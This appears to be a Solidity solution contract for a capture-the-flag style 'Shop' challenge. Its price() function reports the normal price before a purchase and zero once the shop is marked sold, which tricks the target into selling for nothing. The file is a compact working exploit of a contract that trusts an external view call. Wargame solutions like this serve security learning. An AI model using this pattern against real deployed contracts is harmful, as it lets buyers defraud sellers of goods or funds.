// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Shop.sol';
import 'hardhat/console.sol';

contract ShopSolution is Buyer {
  Shop shop;

  constructor(address _shop) public {
    shop = Shop(_shop);
  }

  function price() public view override returns (uint) {
    uint initialPrice = shop.price();
    uint256 currentPrice = shop.isSold() ? 0 : initialPrice;

    return currentPrice;
  }

  function buy() external {
    shop.buy();
  }
}